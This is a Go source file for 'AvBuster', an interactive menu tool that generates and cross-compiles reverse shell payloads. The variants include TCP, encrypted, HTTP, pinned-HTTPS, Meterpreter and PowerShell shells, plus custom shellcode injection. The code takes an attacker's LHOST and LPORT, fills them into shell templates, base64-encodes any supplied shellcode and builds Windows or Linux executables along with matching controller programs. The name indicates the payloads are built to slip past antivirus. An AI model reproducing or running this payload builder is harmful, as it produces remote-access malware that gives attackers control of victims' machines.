package main

import (
	"bufio"
	"bytes"
	"compress/flate"
	b64 "encoding/base64"
	"fmt"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"

	"./binarytemplates"

	"github.com/fatih/color"
)

type DownloadLink struct {
	Link string
}

type UserValues struct {
	userchoice         string
	lport              string
	lhost              string
	shellcode          string
	shellcodedeckey    string
	saveas             string
	privatekey         string
	publickey          string
	fingerprint        string
	targetos           string
	targetarchitecture string
	binarytemplate     string
	ismanager          bool
}

var dwnloadlink DownloadLink
var usrvals UserValues
var choice string

var basepath, exepath, exeoutpath, downloadlink string
var outpath, manageroutpath string

func init() {
	dwnloadlink = DownloadLink{}
	usrvals = UserValues{}

}
func main() {
	ylw := color.New(color.FgHiYellow, color.Bold)
	gr := color.New(color.FgHiGreen, color.Bold)
	rd := color.New(color.FgHiRed, color.Bold)
	//wht := color.New(color.FgHiWhite, color.Bold)
	bl := color.New(color.FgHiBlue, color.Bold)

	printavbusterbanner()
	options := bufio.NewReader(os.Stdin)

	for choice != "0" {
		gr.Println("1. TCP Normal Reverse Shell\t\t2. Hybrid Encrypted Reverse Shell")
		gr.Println("3. HTTP Reverse Shell      \t\t4.Meterpreter HTTP Shell")
		gr.Println("5. HTTPS[Pinned] Reverse Shell     \t\t6. Meterpreter HTTPS Shell")
		gr.Println("7. PowerShell TCP Reverse Shell\t8. PowerShell Custom Shell Code")
		gr.Println("9. MS Build TCP Reverse Shell\t\t10. MS Xml Xslt TCP Reverse Shell")
		gr.Println("11. InstallUtil TCP Reverse Shell\t12. MS ForFiles")
		rd.Printf("0. Exit\n")
		bl.Printf("(AvBuster) > ")
		//wht.Printf("Select Your Option $: ")
		choice, _ = options.ReadString('\n')
		choice = removenewline(choice)
		finflag := make(chan string)
		if choice != "0" {
			usrvals = readvalues(choice)
		}
		if choice == "1" {
			//usrvals = readvalues(choice)
			outpath = filepath.FromSlash("outfiles/gotcprevshell.go")
			manageroutpath = filepath.FromSlash("outfiles/gotcprevshellmanager.go")
			usrvals.binarytemplate = binarytemplates.AvBusterTCPSimpleGoReverseShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
			usrvals.binarytemplate = binarytemplates.AvBusterTCPSimpleGoReverseShellManager
			go createavbusterpayload(usrvals, true, finflag)
			<-finflag
			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
		} else if choice == "2" {
			//usrvals = readvalues(choice)
			outpath = filepath.FromSlash("outfiles/hybridshell.go")
			manageroutpath = filepath.FromSlash("outfiles/hybridmanager.go")
			usrvals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
			usrvals.binarytemplate = binarytemplates.AvBusterTCPHybridReverseShellManager
			//fmt.Println(usrvals.binarytemplate)
			go createavbusterpayload(usrvals, true, finflag)
			<-finflag
			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
		} else if choice == "3" {
			outpath = filepath.FromSlash("outfiles/httprevshell.go")
			manageroutpath = filepath.FromSlash("outfiles/httprevmngr.go")
			usrvals.binarytemplate = binarytemplates.AvBusterHttpReverseShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
			usrvals.binarytemplate = binarytemplates.AvBusterHttpReverseShellManager
			go createavbusterpayload(usrvals, true, finflag)
			<-finflag
			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)
		} else if choice == "4" {
			outpath = filepath.FromSlash("outfiles/httpmeterpret.go")
			usrvals.binarytemplate = binarytemplates.AvBusterHttpMeterPreterShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
		} else if choice == "5" {
			outpath = filepath.FromSlash("outfiles/pinnedcert.go")
			manageroutpath = filepath.FromSlash("outfiles/pinnedcertmanager.go")
			usrvals.binarytemplate = binarytemplates.AvBusterHttpsPinnedCertReverseShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
			usrvals.binarytemplate = binarytemplates.AvBusterHttpsPinnedCertReverseShellManager
			go createavbusterpayload(usrvals, true, finflag)
			<-finflag
			ylw.Println("Shellcontroller is ready to use @ " + dwnloadlink.Link)

		} else if choice == "6" {
			outpath = filepath.FromSlash("outfiles/httpsmeterpret.go")
			usrvals.binarytemplate = binarytemplates.AvBusterHttpsMeterPreterShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
		} else if choice == "7" {
			//usrvals = readvalues(choice)
			outpath = filepath.FromSlash("outfiles/powrevtcp.go")
			usrvals.binarytemplate = binarytemplates.AvBusterPowerShellTCPReverseShell
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
		} else if choice == "8" {
			outpath = filepath.FromSlash("outfiles/psrevcustom.go")
			usrvals.binarytemplate = binarytemplates.AvBusterPowerShellCustomShellCode
			go createavbusterpayload(usrvals, false, finflag)
			<-finflag
			ylw.Println("Binary is ready to use @ " + dwnloadlink.Link)
		}
	}
}

func removenewline(val string) string {
	if runtime.GOOS == "linux" {
		val = strings.Replace(val, "\n", "", -1)
	} else {
		val = strings.TrimSuffix(val, "\r\n")
	}
	return val
}

func readvalues(choice string) UserValues {
	options := bufio.NewReader(os.Stdin)
	ylw := color.New(color.FgHiYellow, color.Bold)
	gr := color.New(color.FgHiGreen, color.Bold)
	bl := color.New(color.FgHiBlue, color.Bold)
	var fprint, selectedos, selectedarch, shellcode, lhost, lport string
	actualusrvals := UserValues{}
	if choice == "8" {
		var printshelltype string
		actualusrvals.userchoice = "8"
		bl.Printf("(AvBuster) > ")
		ylw.Printf("Architectue : ")
		gr.Printf("[1]. 32Bit  [2]. 64Bit : ")
		arch, _ := options.ReadString('\n')
		arch = removenewline(arch)
		if arch == "1" {
			selectedarch = "386"
			printshelltype = "32 Bit Shell Code : "

		} else {
			selectedos = "amd64"
			printshelltype = "64 Bit Shell Code : "
		}
		bl.Printf("(AvBuster) > ")
		ylw.Printf(printshelltype)
		shellcode, _ = options.ReadString('\n')
		shellcode = removenewline(shellcode)
		selectedos = "windows"
		//compressedshellcode := compresshellcode(shellcode)
		encodedshellcode := b64.StdEncoding.EncodeToString([]byte(shellcode))
		shellcode = encodedshellcode
	} else {
		bl.Printf("(AvBuster) > ")
		ylw.Printf("Set LHOST : ")
		lhost, _ = options.ReadString('\n')
		lhost = removenewline(lhost)
		bl.Printf("(AvBuster) > ")
		ylw.Printf("Set LPORT : ")
		lport, _ = options.ReadString('\n')
		lport = removenewline(lport)

		if choice == "5" {
			bl.Printf("(AvBuster) > ")
			ylw.Printf("Cert Fingerprint : ")
			fprint, _ = options.ReadString('\n')
			fprint = removenewline(fprint)
		}
		if choice == "7" {
			selectedos = "windows"
		} else {
			bl.Printf("(AvBuster) > ")
			ylw.Printf("OSTYPE : ")
			gr.Printf("[1]. Windows  [2]. Linux : ")
			ostype, _ := options.ReadString('\n')
			ostype = removenewline(ostype)
			if ostype == "1" {
				selectedos = "windows"
			} else {
				selectedos = "linux"
			}
		}
		bl.Printf("(AvBuster) > ")
		ylw.Printf("Architectue : ")
		gr.Printf("[1]. 32Bit  [2]. 64Bit : ")
		arch, _ := options.ReadString('\n')
		arch = removenewline(arch)
		if arch == "1" {
			selectedarch = "386"
		} else {
			selectedarch = "amd64"
		}
	}
	bl.Printf("(AvBuster) > ")
	ylw.Printf("Save as : ")
	saveas, _ := options.ReadString('\n')
	saveas = removenewline(saveas)
	actualusrvals.lhost = lhost
	actualusrvals.lport = lport
	actualusrvals.saveas = saveas
	actualusrvals.targetos = selectedos
	actualusrvals.targetarchitecture = selectedarch
	actualusrvals.fingerprint = fprint
	actualusrvals.shellcode = shellcode

	return actualusrvals
}

func compresshellcode(source string) []byte {
	w, _ := flate.NewWriter(nil, 7)
	buf := new(bytes.Buffer)
	w.Reset(buf)
	w.Write([]byte(source))
	w.Close()
	return buf.Bytes()
}

func avbusterbuildexe(exepath, gofilepath, ostype, arch string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		execargs = "GOOS=" + ostype + " GOARCH=" + arch + " go build -o " + exepath + " " + gofilepath

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			//fmt.Println("Build Success !")
		}
	} else {
		buildpath := filepath.FromSlash(`c:\windows\temp\build.bat`)
		buildbat, err := os.Create(buildpath)
		if err != nil {
			log.Fatal(err)
		}
		buildbat.WriteString("SET GOOS=" + ostype + "\n")
		buildbat.WriteString("SET GOARCH=" + arch + "\n")
		buildbat.WriteString("go build -o " + exepath + " " + gofilepath + " " + "\n")
		buildbat.Close()

		err = exec.Command(buildpath).Run()
		if err != nil {
			fmt.Println(err)
		} else {
			//fmt.Println("Binary is ready to use on " + exepath)
			//fmt.Println(gofilepath)
			//fmt.Println("Build Success !")
		}
	}
}

func buildexe(exepath string, gofilepath string) {
	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		execargs := "GOOS=windows GOARCH=386 go build -o " + exepath + " " + gofilepath
		fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			//fmt.Println(exepath)
			//fmt.Println(gofilepath)
			//fmt.Println("Build Success !")
		}
	} else {
		cmd := exec.Command("go", "build", "-o", exepath, gofilepath)
		err := cmd.Start()
		cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			//fmt.Println(exepath)
			//fmt.Println(gofilepath)
			//fmt.Println("Build Success !")
		}
	}
}

func buildrevshellexeforpscript() {
	cmd := exec.Command("go", "build", "-o", "download/rev.exe", "outfiles/rev.go")
	err := cmd.Start()
	cmd.Wait()
	if err != nil {
		fmt.Println(err)

	}
	//finflag <- "exe generated"
}

func shellexeccompress(source string) []byte {
	w, _ := flate.NewWriter(nil, 7)
	buf := new(bytes.Buffer)
	w.Reset(buf)
	w.Write([]byte(source))
	w.Close()
	return buf.Bytes()
}

func readandreplacefilecontent(ipport string) string {
	baseframefile, err := os.Open("basefiles/encode.txt")
	if err != nil {
		log.Fatal(err)
	}
	defer baseframefile.Close()

	/*newgoFile, err := os.Create("outfiles/rev.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newgoFile.Close()*/
	filestring := ""
	baseframescanner := bufio.NewScanner(baseframefile)
	for baseframescanner.Scan() {
		str := baseframescanner.Text()
		if strings.Contains(str, "IP:PORT") {
			//fmt.Println(str)
			str = strings.Replace(str, "IP:PORT", ipport, 1)
		}
		filestring += str
		filestring += "\n"
	}

	if err := baseframescanner.Err(); err != nil {
		log.Fatal(err)
	}
	return filestring
}

func createavbusterpayload(userselectedval UserValues, ismanager bool, finflag chan string) {
	var setpath, valuetowrite string
	if ismanager {
		dwnloadlink.Link = "download/" + userselectedval.saveas + "manager" + ".exe"

		setpath = manageroutpath
	} else {
		setpath = outpath
		dwnloadlink.Link = "download/" + userselectedval.saveas + ".exe"

	}
	//if ismanager {
	//fmt.Println(setpath)
	//}
	//fmt.Println(userselectedval.binarytemplate)
	ipandport := userselectedval.lhost + ":" + userselectedval.lport
	ipandportreplaced := strings.Replace(userselectedval.binarytemplate, "REVIPPORT", ipandport, 1)
	finalval := strings.Replace(ipandportreplaced, "FPRINT", userselectedval.fingerprint, 1)
	managerfinalval := strings.Replace(finalval, "REVPRT", userselectedval.lport, 1)

	replaceunwantedchars := strings.Replace(managerfinalval, "RPL", "`", -1)
	ipreplaced := strings.Replace(replaceunwantedchars, "RHOST", userselectedval.lhost, 1)
	portreplaced := strings.Replace(ipreplaced, "RPORT", userselectedval.lport, 1)
	valuetowrite = strings.Replace(portreplaced, "SHELLCODE", userselectedval.shellcode, 1)

	fmt.Println(valuetowrite)

	//fmt.Println(setpath)
	newFile, err := os.Create(setpath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()
	newFile.WriteString(valuetowrite)

	avbusterbuildexe(dwnloadlink.Link, setpath, userselectedval.targetos, userselectedval.targetarchitecture)
	finflag <- "build succeed"
}

// creategopayload("basefiles/gorevhttp.go","outfiles/gorevhttp.go","download/gorevhttp.exe","outfiles/gorevhttp.go")
func creategopayload(ipandport, basefilepath, outfilepath, downloadlink, sourcefilelink, ostype, archtype, fprint string) {
	file, err := os.Open(basefilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		if strings.Contains(str, "FPRINT") {
			str = strings.Replace(str, "FPRINT", fprint, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	if ostype != "" && archtype != "" {
		//fmt.Println("bulding " + downloadlink)
		//fmt.Println("buiulding " + sourcefilelink)
		//buildrevshellexe(downloadlink, sourcefilelink, ostype, archtype)
	} else {
		//buildexe(downloadlink, sourcefilelink)
	}
}

func copyfile(sourcepath, destpath string) {
	srcpubkfile, err := os.Open(sourcepath)
	if err != nil {
		fmt.Println(err)
	}
	defer srcpubkfile.Close()
	newpubkFile, err := os.Create(destpath)
	if err != nil {
		fmt.Println(err)
	}
	defer newpubkFile.Close()

	scanner := bufio.NewScanner(srcpubkfile)
	for scanner.Scan() {
		str := scanner.Text()

		newpubkFile.WriteString(str + "\n")
	}

	if err = scanner.Err(); err != nil {
		log.Fatal(err)
	}
}

func createrevgoshell(revshellfilepath, outfilepath, port string, copycerts bool) {
	if copycerts {
		copyfile("manager/server.crt", "download/server.crt")
		copyfile("manager/server.key", "download/server.key")
	}

	file, err := os.Open(revshellfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create(outfilepath)
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVPRT") {
			str = strings.Replace(str, "REVPRT", port, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	//buildexe("download/"+"tcprev"+".exe", "outfiles/rev.go")

	if runtime.GOOS == "linux" {
		cmdpath, _ := exec.LookPath("bash")
		var execargs string
		execargs = "go build -o download/tcprev " + outfilepath

		//fmt.Println(execargs)
		cmd := exec.Command(cmdpath, "-c", execargs)
		err := cmd.Start()
		//cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Server is ready !")
		}
	} else {
		//fmt.Println("About to build " + gofilepath)
		cmd := exec.Command("go", "build", "-o", "download/tcprev.exe", outfilepath)
		err := cmd.Start()
		//cmd.Wait()
		if err != nil {
			fmt.Println(err)
		} else {
			fmt.Println(exepath)
			//fmt.Println(gofilepath)
			fmt.Println("Server is ready !")
		}
	}

}

func creategorevhttppayload(ipandport string) {
	file, err := os.Open("basefiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer file.Close()

	newFile, err := os.Create("outfiles/gorevhttp.go")
	if err != nil {
		log.Fatal(err)
	}
	defer newFile.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		str := scanner.Text()
		if strings.Contains(str, "REVIPPORT") {
			str = strings.Replace(str, "REVIPPORT", ipandport, 1)
		}
		newFile.WriteString(str + "\n")
	}

	if err := scanner.Err(); err != nil {
		log.Fatal(err)
	}
	buildexe("download/gorevhttp.exe", "outfiles/gorevhttp.go")
}

func printavbusterbanner() {
	ylw := color.New(color.FgHiYellow, color.Bold)
	ylw.Println(` 
					 █████╗ ██╗   ██╗██████╗ ██╗   ██╗███████╗████████╗███████╗██████╗ 
					██╔══██╗██║   ██║██╔══██╗██║   ██║██╔════╝╚══██╔══╝██╔════╝██╔══██╗
					███████║██║   ██║██████╔╝██║   ██║███████╗   ██║   █████╗  ██████╔╝
					██╔══██║╚██╗ ██╔╝██╔══██╗██║   ██║╚════██║   ██║   ██╔══╝  ██╔══██╗
					██║  ██║ ╚████╔╝ ██████╔╝╚██████╔╝███████║   ██║   ███████╗██║  ██║
					╚═╝  ╚═╝  ╚═══╝  ╚═════╝  ╚═════╝ ╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
																		`)
}
